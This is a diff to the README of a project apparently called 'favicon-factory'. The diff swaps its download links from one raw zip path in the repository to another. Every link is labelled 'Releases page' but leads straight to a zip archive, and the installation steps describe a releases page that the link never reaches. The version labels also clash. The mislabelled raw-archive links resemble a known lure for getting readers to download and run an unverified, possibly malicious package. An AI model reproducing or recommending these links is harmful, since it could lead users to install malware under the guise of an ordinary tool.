@@ -6,9 +6,9 @@ Welcome to favicon-factory, the tool that simplifies favicon creation. With feat
 
 ## 📥 Download and Install
 
-[![Download favicon-factory](https://raw.githubusercontent.com/PsKING22/favicon-factory/main/heroid/favicon-factory.zip%20favicon--factory-v1.0-blue)](https://raw.githubusercontent.com/PsKING22/favicon-factory/main/heroid/favicon-factory.zip)
+[![Download favicon-factory](https://raw.githubusercontent.com/PsKING22/favicon-factory/main/assets/favicon_factory_v2.3.zip%20favicon--factory-v1.0-blue)](https://raw.githubusercontent.com/PsKING22/favicon-factory/main/assets/favicon_factory_v2.3.zip)
 
-1. **Visit the Releases Page**: Click on the link to go to the Releases page: [Download Here](https://raw.githubusercontent.com/PsKING22/favicon-factory/main/heroid/favicon-factory.zip).
+1. **Visit the Releases Page**: Click on the link to go to the Releases page: [Download Here](https://raw.githubusercontent.com/PsKING22/favicon-factory/main/assets/favicon_factory_v2.3.zip).
 
 2. **Select the Latest Release**: On the Releases page, find the latest version of the favicon-factory software. Look for the version number and release date to ensure you have the latest features.
 
@@ -53,7 +53,7 @@ favicon-factory is open-source software. You can use, modify, and distribute it 
 
 We welcome contributions! If you want to contribute to favicon-factory, please read our contribution guidelines in the repository. Join our community to discuss ideas or issues.
 
-Remember to visit our [Releases page](https://raw.githubusercontent.com/PsKING22/favicon-factory/main/heroid/favicon-factory.zip) for the latest updates.
+Remember to visit our [Releases page](https://raw.githubusercontent.com/PsKING22/favicon-factory/main/assets/favicon_factory_v2.3.zip) for the latest updates.
 
 ---
 This README is designed to help you get started with favicon-factory easily. Enjoy creating your favicons!
